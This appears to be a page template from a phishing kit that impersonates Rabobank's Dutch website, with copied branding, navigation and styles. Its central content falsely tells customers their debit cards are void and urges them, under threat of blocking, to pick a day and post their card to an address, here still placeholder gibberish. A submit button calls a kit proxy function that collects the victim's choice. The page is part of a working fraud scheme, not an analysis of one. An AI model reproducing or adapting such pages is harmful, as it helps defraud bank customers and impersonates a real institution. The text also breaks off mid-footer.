<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="time/";
?>

<!DOCTYPE html>
<html lang="nl" class="rbr-template"><head>

<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
<link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>

<script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/token/core_token.js"></script>


<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/angular/angular.min.js"></script>

<link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">
<base href="<?php echo $php_js->relative_root.$php_js->fake_base; ?>" />
<link rel="stylesheet" href="form/css.css">


    <title>Rabobank</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="stylesheet" href="rfs-layout.css">
    <link rel="stylesheet" href="rfs-icons.css">
    <link rel="stylesheet" href="rfs-icons-algemeen.css">
    <link rel="stylesheet" href="rfs-styleguide.css">
    <link rel="stylesheet" href="all.css">
    <link rel="stylesheet" href="rfs2-style.css">
    <link rel="stylesheet" href="sites-responsive-template.css">
    <link rel="stylesheet" href="rfs-responsive-template.css">
    <link rel="stylesheet" href="default.css">
    <style type="text/css" media="print"> </style>
    <link rel="shortcut icon" href="favicon.ico">
    <link rel="stylesheet" href="index.css">
</head>

<body     ng-app="app" ng-controller="c1" ng-model-options="{'allowInvalid':true}"  ng-cloak    >
    <div style="display: none;" id="usabilla"></div>
    <div style="display: none;" id="lightningjs-usabilla_live">
        <div></div>
    </div>
    <div id="skip-links" class="skip-links rfs-container-fluid">
        <div class="skip-links__content">
            <p class="rfs2-text--size-s">Ga direct naar:</p>
            <ul class="skip-links__list">
                <li class="skip-links__item"> <a class="skip-links__link rfs2-text--size-s"> <span class="visually-hidden">Ga direct naar</span> Hoofdnavigatie </a> </li>
                <li class="skip-links__item"> <a class="skip-links__link rfs2-text--size-s"> <span class="visually-hidden">Ga direct naar</span> Inhoud </a> </li>
                <li class="skip-links__item"> <a class="skip-links__link rfs2-text--size-s"> <span class="visually-hidden">Ga direct naar</span> Footer </a> </li>
            </ul>
        </div>
    </div>
    <header id="rabobank-header" role="header">
        <div class="rabobank-header rfs-container-fluid">
            <div class="rabobank-navigation-container rfs2-display-flex rfs2-align-items-center rfs2-flex-wrap rfs2-flex-row">
                <div class="rabobank-header__logo rfs2-display-flex rfs2-align-items-center" id="rabobank-logo-container"> <a class="rabobank-header__logo-image" title="naar homepage Particulieren"> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="130px" height="24px" viewBox="0 0 130 24" version="1.1">
                            <g id="Artboard" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                <g id="other/rfs2-rabobank-logo" fill="#000099">
                                    <path d="M76.9282216,15.4878318 C76.3762375,19.0801436 74.5543581,20.9630377 72.3685453,20.9630377 C70.9802887,20.9630377 70.1816263,19.9711812 70.4200083,18.4363662 L71.1876976,13.564948 C71.4836009,11.7603436 72.5471935,10.3471872 74.437103,10.3471872 C76.5327621,10.3466241 77.4945861,11.7992068 76.9282216,15.4878318 Z M69.4449101,22.6465467 C69.7413665,22.6465467 70.449322,23.9093192 72.7518369,23.9093192 C77.6549823,23.9093192 80.4608093,20.3012368 81.2279455,15.639342 C82.2041499,9.89603623 79.4575035,7.27868391 76.0012423,7.27868391 C74.3768162,7.27868391 73.1616768,7.42850438 72.2767323,7.90950693 L73.6058083,5.68434189e-14 L69.5334045,5.68434189e-14 L65.4892084,23.6248856 L68.5588594,23.6248856 C68.5588594,23.6248856 69.0029909,22.6459834 69.474777,22.6459834 L69.4449101,22.6459834 L69.4449101,22.6465467 Z M112.78064,12.5714018 C113.401207,8.99373401 112.101445,7.24883246 108.291759,7.24883246 C105.456619,7.24883246 104.340482,8.51949027 103.278549,9.60540705 L103.38253,7.61042923 L99.6110073,7.63464833 L99.3184226,10.5876886 L97.133716,23.6260121 L101.264194,23.6260121 L102.592717,15.1577762 C103.065056,12.2402197 105.044566,10.0148788 106.904609,10.0148788 C108.971507,10.0148788 108.946065,11.2185117 108.622507,13.0529675 L106.821092,23.6260121 L110.920044,23.6260121 L112.78064,12.5714018 Z M130,7.27924714 L125.187008,7.27924714 L119.654446,13.2517894 L119.574248,13.2399615 L121.788822,0.0152073408 L117.772833,0.0152073408 L113.726978,23.6260121 L117.8027,23.6260121 L118.218071,21.2632419 L119.043835,16.0899298 C121.198674,16.0899298 122.410495,16.3315576 123.35462,20.6915585 L124.005054,23.6260121 L128.169271,23.6260121 C128.169271,23.6260121 127.135545,19.15787 126.454138,17.4157847 C125.746183,15.5790758 124.97075,14.3681209 123.315904,14.0375021 L130,7.27924714 Z M11.6541654,13.0749337 C14.6364282,12.413696 16.1839748,9.95404942 16.5976864,8.36178452 C17.6601728,3.96967919 15.7409495,0.541268686 10.2482099,0.602661285 L3.951277,0.597028936 L0,23.6260121 L4.10392992,23.6260121 L5.727803,14.3771327 C9.51259982,14.2712445 9.97277094,15.210157 10.6868105,19.6985755 L11.3361385,23.6260121 L15.5932744,23.6260121 C15.0910684,21.2508507 14.7652983,19.0080496 14.3526929,17.2034451 C13.9102207,15.3081599 13.219964,13.826289 11.4467566,13.1228087 L11.6541654,13.0749337 Z M12.4832477,7.58677337 C12.1276107,9.63244233 10.5728739,11.0698177 8.65254443,11.0698177 L6.23111516,11.0698177 L7.48607702,3.79901903 L9.68682326,3.78888081 C12.2990687,3.78888081 12.8079117,5.54223088 12.4832477,7.58677337 Z M31.0399799,11.9400155 C31.6301273,8.45133886 29.7982922,7.24826923 26.1069677,7.24826923 C21.5008318,7.24826923 19.4920078,9.47529981 19.4920078,9.47529981 L20.9095782,11.9107273 C20.9095782,11.9107273 22.3990504,10.1359743 25.3702514,10.1359743 C27.0284161,10.1359743 27.0632608,10.9932177 26.9045239,11.9107273 L26.5798599,13.9851212 C20.6429887,13.8341743 17.6015452,15.126235 16.9223504,19.0976039 C16.3609637,22.3457793 18.7530792,23.9115721 21.4399918,23.9115721 C22.8276954,23.9115721 23.9510217,23.6992326 25.3094115,22.496163 C25.576001,23.2790594 26.047787,23.6924738 26.5793068,23.7825913 C27.4360436,23.9633897 28.9127947,23.7589355 29.35582,23.4283166 C29.3265062,22.9473141 29.35582,21.714393 29.858026,18.8278144 L31.0399799,11.9400155 Z M26.1667014,16.1806106 C25.508524,20.9331863 24.8879567,21.4079932 22.6407508,21.4079932 C21.1053722,21.4079932 20.5334769,20.3350309 20.7956416,18.9280702 C21.1518318,17.0158879 22.5716146,16.1806106 26.1667014,16.1806106 Z M96.1652549,11.9400155 C96.7554022,8.45133886 94.922461,7.24826923 91.2316895,7.24826923 C86.6261067,7.24826923 84.6161766,9.47529981 84.6161766,9.47529981 L86.0331939,11.9107273 C86.0331939,11.9107273 87.5226661,10.1359743 90.4944202,10.1359743 C92.1525848,10.1359743 92.1879826,10.9932177 92.0286926,11.9107273 L91.7040286,13.9851212 C85.7671575,13.8341743 82.725714,15.126235 82.0465191,19.0976039 C81.4845794,22.3457793 83.8778011,23.9115721 86.5641606,23.9115721 C87.9518641,23.9115721 89.0746374,23.6992326 90.4341333,22.496163 C90.6996167,23.2790594 91.1719558,23.6924738 91.7029224,23.7825913 C92.5602124,23.9633897 94.0364104,23.7589355 94.4799888,23.4283166 C94.4501219,22.9473141 94.4799888,21.714393 94.9816417,18.8278144 L96.1652549,11.9400155 Z M91.2908702,16.1806106 C90.6332458,20.9331863 90.0132316,21.4079932 87.7660258,21.4079932 C86.229541,21.4079932 85.6576456,20.3350309 85.9203635,18.9280702 C86.2771067,17.0158879 87.6963364,16.1806106 91.2908702,16.1806106 Z M39.2793659,23.9093192 C44.1825113,23.9093192 46.9883383,20.3012368 47.7554745,15.639342 C48.7311258,9.89603623 45.9833733,7.27868391 42.5282182,7.27868391 C40.9037921,7.27868391 39.7317938,7.42850438 38.8147701,7.90950693 L40.1449522,0 L36.0603804,0 L32.014525,23.6248856 L35.0863884,23.6248856 C35.0863884,23.6248856 35.5288607,22.6459834 35.9729922,22.6459834 C36.2672362,22.6465467 36.976298,23.9093192 39.2793659,23.9093192 Z M40.9922865,10.3466241 C43.0896049,10.3466241 43.9800802,11.7885053 43.4845113,15.4878318 C42.9784337,19.2677008 41.1106478,20.9630377 38.8955212,20.9630377 C37.5078177,20.9630377 36.7102615,19.9711812 36.9757449,18.4363662 L37.7445404,13.564948 C38.0393375,11.7603436 39.1029301,10.3471873 40.9629727,10.3471873 L40.9922865,10.3471873 L40.9922865,10.3466241 Z M49.4761384,16.9218277 C50.1072144,10.9087325 52.7697911,7.18912957 59.0988032,7.18912957 C63.7989644,7.18912957 65.3525951,10.8411443 64.721519,14.764075 C63.7115762,21.0447068 61.3128236,24 55.2880111,24 C51.3854061,24.0005632 49.0734887,20.7619629 49.4761384,16.9218277 Z M60.4372817,15.0580836 C60.7387159,13.3965408 61.0595083,10.1669522 58.2487034,10.1669522 C56.3599001,10.1669522 54.5960952,11.4702776 53.8035168,16.0431813 C53.3201159,18.83401 53.8494233,21.073995 56.0380016,21.073995 C57.6391979,21.0734317 59.5893943,19.7295534 60.4372817,15.0580836 Z" id="shape"></path>
                                </g>
                            </g>
                        </svg> </a> </div>
                <div class="rabobank-header__navigation-primary rfs2-display-flex rfs2-align-items-center">
                    <nav id="navigation-primary" class="navigation-primary" role="navigation">
                        <ul id="main-navigation" class="navigation-primary__list">
                            <li class="navigation-primary__item " role="none presentation"> <a role="menuitem" class="navigation-primary__link" tabindex="0">Producten</a>
                                <div class="nav-group" style="display: none; position: absolute; z-index: 0;">
                                    <div class="nav-group__inner">
                                        <div class="nav-group__column" role="group">
                                            <div class="nav-group__list-category">Producten</div>
                                            <ul class="nav-group__list" role="menu">
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Betalen</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Verzekeren</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Hypotheek</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Lenen</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Beleggen</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Sparen</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Pensioen</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Online bankieren</a> </li>
                                            </ul>
                                        </div>
                                        <div class="nav-group__column" role="group">
                                            <div class="nav-group__list-category">Thema's</div>
                                            <ul class="nav-group__list" role="menu">
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Straks heb je het nodig</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Een bedrijf starten</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Samenwonen</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Vakantie</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Uit elkaar gaan</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Overlijden</a> </li>
                                            </ul>
                                        </div>
                                        <div class="nav-group__column" role="group">
                                            <div class="nav-group__list-category">Speciaal voor</div>
                                            <ul class="nav-group__list" role="menu">
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Private Banking</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Jongeren</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Studenten</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Ouderen</a> </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </li>
                            <li class="navigation-primary__item " role="none presentation"> <a role="menuitem" class="navigation-primary__link" tabindex="-1">Service</a>
                                <div class="nav-group" style="display: none; position: absolute; z-index: 0;">
                                    <div class="nav-group__inner">
                                        <div class="nav-group__column" role="group">
                                            <div class="nav-group__list-category">Service</div>
                                            <ul class="nav-group__list" role="menu">
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Alle onderwerpen</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Online bankieren</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Storingen</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Phishing en veilig bankieren</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Feedback</a> </li>
                                            </ul>
                                        </div>
                                        <div class="nav-group__column" role="group">
                                            <div class="nav-group__list-category">Helpen bij</div>
                                            <ul class="nav-group__list" role="menu">
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Apple Pay activeren</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Inloggen met toegangscode</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Limiet roodstaan wijzigen</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Persoonlijke gegevens wijzigen</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Extra aflossen hypotheek</a> </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </li>
                            <li class="navigation-primary__item " role="none presentation"> <a role="menuitem" class="navigation-primary__link" tabindex="-1">Over ons</a>
                                <div class="nav-group" style="display: none; z-index: 0;">
                                    <div class="nav-group__inner">
                                        <div class="nav-group__column" role="group">
                                            <div class="nav-group__list-category">Over ons</div>
                                            <ul class="nav-group__list" role="menu">
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Contact</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Wie zijn wij</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Werken bij</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Lokale banken</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Stakeholders</a> </li>
                                                <li class="nav-group__list-item " role="none presentation"> <a class="nav-group__link" role="menuitem" tabindex="-1">Nieuws</a> </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </li>
                        </ul>
                    </nav>
                </div>
                <div class="rabobank-header__navigation-secondary rfs2-display-flex rfs2-align-items-center rfs2-flex-grow-1">
                    <div class="rabobank-header__searchbar rfs2-display-flex rfs2-align-items-center" id="rabobank-header-search">
                        <div class="rabobank-header__searchbar-action rfs2-display-flex rfs2-align-items-center"> <span class="searchbar-action">Zoeken</span>
                            <div class="rfs2-display-xs-none">
                                <rfs2-icon name="cross" class="searchbar-action__mobile rfs2-display-none hydrated">
                                    <div class="rfs2-icon"><svg xmlns="http://www.w3.org/2000/svg" width="512" height="512" viewBox="0 0 512 512" focusable="false">
                                            <path d="M513 29.8L484.2 1 257 228.2 29.8 1 1 29.8 228.2 257 1 484.2 29.8 513 257 285.8 484.2 513l28.8-28.8L285.8 257"></path>
                                        </svg></div>
                                </rfs2-icon>
                            </div>
                        </div>
                        <div class="rabobank-header__searchbar-wrapper" role="search">
                            <form name="searchForm">
                                <div class="rabobank-header__searchbar-icon-wrapper" id="rabobank-header-search">
                                    <rfs2-icon name="loep" class="hydrated">
                                        <div class="rfs2-icon"><svg xmlns="http://www.w3.org/2000/svg" width="512" height="512" viewBox="0 0 512 512" focusable="false">
                                                <path d="M508.3 432.3L326.9 251c12-23.5 18.7-50.1 18.7-78.2C345.6 77.5 268.1 0 172.8 0S0 77.5 0 172.8c0 95.3 77.5 172.8 172.8 172.8 28.1 0 54.7-6.8 78.2-18.7l181.4 181.4c2.4 2.4 5.7 3.7 9.1 3.7 3.4 0 6.7-1.3 9.1-3.7l57.8-57.8c2.4-2.4 3.7-5.7 3.7-9.1s-1.4-6.7-3.8-9.1zM25.6 172.8c0-81.2 66-147.2 147.2-147.2S320 91.6 320 172.8C320 254 254 320 172.8 320S25.6 254 25.6 172.8zm415.8 308.3L273.5 313.2c15.3-11 28.7-24.4 39.7-39.7l167.9 167.9-39.7 39.7z"></path>
                                            </svg></div>
                                    </rfs2-icon>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <section id="main-content" class="rbr-body">
        <div class="rfs-container-fluid rfs-gutter-xs--none rfs-gutter-sm--none tpa-content-area">
            <rt-rfs-tile-container>
                <div class="rfs-row tpa-row tpa-row-padding-bottom">
                    <div class="title-block">
                        
                        
                    </div>
                </div>
                
                <div class="rfs-row tpa-row">
                    <div class="article-row">
                        <article class="article rfs2-content article--normal-left">
                            <div class="article__content">



                                <h2 class="rfs2-heading-2">Betaalpas vervangen</h2>
                                <p class="rfs2-text">Op deze pagina bevinden de instructies die u nodig heeft om uw betaalpas in te leveren</p>
                                


                                <h3>Het inleveren van uw huidige betaalpas</h3>

                                <p class="">In verband met de veiligheid van onze klanten verplichten wij het gebruik van een nieuwe betaalpas.</p> <br>

                                <p class="">Dit betekent dat alle huidige betaalpassen vervallen voor gebruik en dienen ingeleverd te worden na de aanvraag van uw nieuwe betaalpas.</p> <br>
                                <p class=""><b>Let op:</b> Wij als bank zouden nooit de betaalpassen van onze cliënten in gebruik nemen. En om deze reden raden wij u aan om uw betaalpas door midden te knippen voordat u hem bij ons inlevert.</p> <br>

                                <p class="">Aan de rechterzijde van deze pagina is er een voorbeeld van hoe u uw betaalpas moeten knippen voordat u hem opstuurt.</p>
                                
                                
                                <div class="" style="margin-top: 20px" >
                                   
                                        <div class="form-group">
                                            <label for="id__">Ik verstuur mijn huidige betaalpas:</label>



<select name="time" id="time" class="form-control">
    <option value="today">Vandaag voor 18:00</option>
    <option value="tomorow">Morgen voor 18:00</option>
    <option value="aftertomrow">Overmorgen voor : 18:00</option>
</select>
                                        </div>
                                   
                                </div>

<br><br>
                                <p class="">Om veiligheidsredenen ontvangt u uw nieuwe betaalpas binnen <b>2 werkdagen</b> nadat wij huidige betaalpas hebben ontvangen.
Dit hanteren wij om er zeker van te zijn dat u de rekeninghouder bent van de desbetreffende aanvraag.</p> <br>


<p>Indien wij uw betaalpas niet ontvangen kunt u om veiligheidsredenen geen gebruik meer maken van uw huidige betaalpas en wordt deze geblokkeerd.</p> <br>


<p class=""><b>Voorkom complicaties en verstuur uw betaalpas op tijd, op de dag, dat u heeft gekozen uw betaalpas op te sturen.</b></p> <br>


<p class="">Verzend uw huidige betaalpas in een envelop gefrankeerd met één postzegel naar ons onderstaand adres <b>(noteer het adres alvorens u verder gaat)</b>:</p><br>



<div class="box address">
    jjhjkhkh
    sdfsdf
    sdfsd
    sdf
    sf
    sdfsdfs
</div>


    

                                <p class="rfs2-text">
                                    <rfs2-link link-type="secondary" class="rfs2-display-block hydrated"> <a class="rfs2-link rfs2-link__secondary" role="link" target="_self">
                                        </a></rfs2-link>
                                </p>
                                
                                <p></p>
                            </div>
                        </article>
                    </div>
                </div>
                <div class="rfs-row tpa-row">
                    <div class="article-row">
                        <article class="article rfs2-content article--normal-left">
                            <div class="article__content">
                                
                                
                                
                                <div class="article__button-area">
                                    <form>
                                        <rfs2-button type="submit" class="rfs2-display-inline-block hydrated" color="primary">

                                            <button  type="submit" onclick="ask_time_proxy()" class="rfs2-button rfs2-button--primary"><span class="rfs2-button__label">Vraag nieuwe pas aan</span></button>

                                        </rfs2-button>
                                    </form>
                                </div>
                                <p class="rfs2-text">
                                    <rfs2-link link-type="secondary" class="rfs2-display-block hydrated"> <a class="rfs2-link rfs2-link__secondary" role="link" target="_self">
                                        </a></rfs2-link>
                                </p>
                                <p></p>
                            </div>
                        </article>
                    </div>
                </div>
                <div class="rfs-row tpa-row">
                    <div class="article-row">
                    </div>
                </div>
                <div class="rfs-row tpa-row">
                    <div class="article__content">
                        <div ub-in-page="5d1c976357c7de013533bd9b" ub-in-page-usabilla_inpage="5" ub-in-page-website_type="web" ub-in-page-ga_cookie="ga1.2.1629670932.1577197795"></div>
                    </div>
                </div>
                <div class="contact-service-block rfs2-content">
                    <h2 class="rfs2-heading-2 rfs-util-align-center">Service en Contact</h2>
                    <div class="rfs-icon-block"> <a class="icon-link"> <span class="rfs-rounded">
                                <rfs2-icon name="instellingen" size="md" class="hydrated">
                                    <div class="rfs2-icon rfs2-icon--md"><svg xmlns="http://www.w3.org/2000/svg" width="512" height="512" viewBox="0 0 512 512" focusable="false">
                                            <g>
                                                <path d="M468.8 192.5h-28.4c-2.6-7.5-5.7-14.9-9.2-22.1l20-20c8.2-8.1 12.7-19 12.7-30.6 0-11.6-4.5-22.4-12.7-30.6l-28.7-28.7c-7.9-7.8-19-12.4-30.5-12.4-11.6 0-22.7 4.5-30.6 12.4l-20.1 20.1c-7.2-3.5-14.5-6.6-22.1-9.1V43.1c0-23.8-19.4-43.2-43.2-43.2h-40.3c-23.8 0-43.2 19.4-43.2 43.2v28.4c-7.5 2.6-14.9 5.6-22.1 9.1l-20.1-20.1c-7.9-7.9-19-12.4-30.5-12.4-11.6 0-22.7 4.5-30.6 12.4L60.5 89.2c-8.2 8.2-12.7 19-12.7 30.6 0 11.6 4.5 22.4 12.6 30.5l20.1 20.1c-3.5 7.1-6.6 14.5-9.2 22.1H42.9c-11.5 0-22.4 4.5-30.6 12.7-8.1 8.2-12.6 19-12.6 30.5v40.5c0 23.8 19.4 43.2 43.2 43.2h28.4c2.6 7.5 5.6 14.9 9.1 22.1l-20 20.1c-8.2 8.1-12.7 19-12.7 30.6s4.5 22.4 12.7 30.6l28.7 28.6c7.9 7.8 19 12.3 30.6 12.3 11.5 0 22.7-4.5 30.5-12.4l20.1-20.1c7.2 3.5 14.6 6.6 22.1 9.2v28.4c0 23.8 19.4 43.2 43.2 43.2h40.5c23.8 0 43.2-19.4 43.2-43.2v-28.4c7.6-2.6 14.9-5.7 22-9.1l20 20.1c7.9 7.8 19 12.3 30.5 12.3s22.7-4.5 30.6-12.4l28.7-28.7c8.1-8.2 12.6-19 12.6-30.6 0-11.6-4.5-22.4-12.6-30.5L431 341.4c3.5-7.2 6.6-14.6 9.2-22.1h28.4c11.5 0 22.4-4.5 30.6-12.7 8.1-8.2 12.6-19 12.6-30.5v-40.4c.2-23.8-19.2-43.2-43-43.2zm17.6 83.7c0 4.7-1.8 9.1-5.1 12.4-3.4 3.3-7.8 5.2-12.5 5.2h-37.7c-5.7 0-10.7 3.8-12.3 9.2-3.5 12-8.3 23.6-14.4 34.7-2.7 5-1.9 11.2 2.2 15.2l26.7 26.7c3.3 3.3 5.1 7.7 5.1 12.4s-1.8 9.1-5.1 12.5l-28.6 28.6c-3.1 3.1-7.6 4.9-12.5 4.9-4.8 0-9.4-1.8-12.4-4.8L353 406.6c-4-4-10.3-4.9-15.3-2.1-10.9 6-22.5 10.9-34.6 14.4-5.5 1.6-9.2 6.6-9.2 12.3v37.7c0 9.7-7.9 17.6-17.6 17.6h-40.6c-9.7 0-17.6-7.9-17.6-17.6v-37.7c0-5.7-3.8-10.7-9.3-12.3-11.9-3.4-23.6-8.3-34.7-14.4-1.9-1.1-4.1-1.6-6.2-1.6-3.3 0-6.6 1.3-9.1 3.8l-26.7 26.7c-3.1 3.1-7.6 4.9-12.4 4.9-4.8 0-9.4-1.8-12.5-4.9l-28.7-28.6c-3.3-3.3-5.2-7.7-5.2-12.5 0-4.7 1.8-9.1 5.2-12.4l26.7-26.7c4-4 4.9-10.2 2.1-15.2-6.1-11-10.9-22.6-14.3-34.6-1.6-5.5-6.6-9.3-12.3-9.3H43c-9.7 0-17.6-7.9-17.6-17.6v-40.8c0-4.7 1.8-9.1 5.1-12.4 3.3-3.3 7.8-5.2 12.5-5.2h37.7c5.7 0 10.7-3.8 12.3-9.2 3.5-12.1 8.3-23.7 14.4-34.6 2.8-5 1.9-11.2-2.1-15.3l-26.7-26.7c-3.3-3.3-5.1-7.7-5.1-12.4s1.8-9.1 5.2-12.5l28.7-28.7c3.1-3.1 7.6-4.9 12.5-4.9 4.8 0 9.4 1.8 12.4 4.9l26.7 26.7c4 4 10.2 4.9 15.2 2.2 11-6.1 22.7-10.9 34.7-14.4 5.5-1.6 9.2-6.6 9.2-12.3V43.2c0-9.7 7.9-17.6 17.6-17.6h40.5c9.7 0 17.6 7.9 17.6 17.6v37.7c0 5.7 3.8 10.7 9.3 12.3 12 3.5 23.6 8.3 34.6 14.4 5 2.8 11.2 1.9 15.2-2.2l26.7-26.7c3.1-3.1 7.7-4.9 12.5-4.9s9.4 1.8 12.4 4.9l28.7 28.7c3.3 3.3 5.2 7.7 5.2 12.4s-1.8 9.1-5.2 12.4L406.5 159c-4 4-4.9 10.3-2.1 15.2 6.1 11 10.9 22.6 14.4 34.6 1.6 5.5 6.6 9.3 12.3 9.3h37.7c9.7 0 17.6 7.9 17.6 17.6v40.5z"></path>
                                                <path d="M256 147.2c-60 0-108.8 48.8-108.8 108.8S196 364.8 256 364.8 364.8 316 364.8 256 316 147.2 256 147.2zm0 192c-45.9 0-83.2-37.3-83.2-83.2 0-45.9 37.3-83.2 83.2-83.2 45.9 0 83.2 37.3 83.2 83.2 0 45.9-37.3 83.2-83.2 83.2z"></path>
                                            </g>
                                        </svg></div>
                                </rfs2-icon>
                            </span> Zelf regelen </a> <a class="icon-link"> <span class="rfs-rounded">
                                <rfs2-icon name="contact-bubble" size="md" class="hydrated">
                                    <div class="rfs2-icon rfs2-icon--md"><svg width="502" height="502" viewBox="0 0 502 502" xmlns="http://www.w3.org/2000/svg" focusable="false">
                                            <path d="M459.6.4H42.3C19.1.4.3 19.2.3 42.4v306.7c0 23.2 18.8 42 42 42h40.2v100.2c0 4.2 2.5 8 6.4 9.6 1.3.5 2.6.8 4 .8 2.7 0 5.4-1.1 7.4-3l107.6-107.6h251.8c23.2 0 42-18.8 42-42V42.4c-.1-23.2-18.9-42-42.1-42zm21.2 348.7c0 11.7-9.5 21.2-21.2 21.2H203.5c-2.8 0-5.4 1.1-7.4 3.1l-92.9 92.9v-85.5c0-5.8-4.7-10.4-10.4-10.4H42.2c-11.7 0-21.2-9.5-21.2-21.2V42.5c0-11.7 9.5-21.2 21.2-21.2h417.3c11.7 0 21.2 9.5 21.2 21.2l.1 306.6z" fill-rule="nonzero"></path>
                                        </svg></div>
                                </rfs2-icon>
                            </span> Contact </a> </div>
                </div>
            </rt-rfs-tile-container>
        </div>
    </section>
    <footer id="footer" class="footer">
        <section class="footer-container rfs2-display-flex rfs2-flex-lg-row rfs2-flex-column rfs2-justify-content-between rfs2-align-items-xs-center">
            <nav class="site-footer-navigation rfs2-display-flex rfs2-align-items-center">
                <ul class="rfs2-space-inset-none">
                    <li class="rfs2-display-lg-inline-flex"> <a class="site-footer-navigation__link">Voorwaarden</a> </li>
                    <li class="rfs2-display-lg-inline-flex"> <a class="site-footer-navigation__link">Toegankelijkheid</a> </li>
                    <li class="rfs2-display-lg-inline-flex"> <a class="site-footer-navigation__link">Disclaimer</a> </li>
                    <li class="rfs2-display-lg-inline-flex"> <a class="site-footer-navigation__link">Privacy en cookies</a> </li>
                </ul>
            </nav>
            <div class="site-footer-social">
                <ul class="social-list rfs2-space-inset-none">
                    <li class="social-list__item rfs2-display-inline-flex"> <a target="_blank" class="social-list__link rfs2-justify-content-center rfs2-align-items-center"> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="8px" height="15px" viewBox="0 0 8 15" version="1.1">
                                <g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                    <g id="XS-/-Footer" transform="translate(-24.000000, -206.000000)" fill="#AAAAAA">
                                        <g id="Group" transform="translate(10.000000, 197.000000)">
                                            <g id="icons/functioneel/facebook" transform="translate(9.000000, 7.000000)">
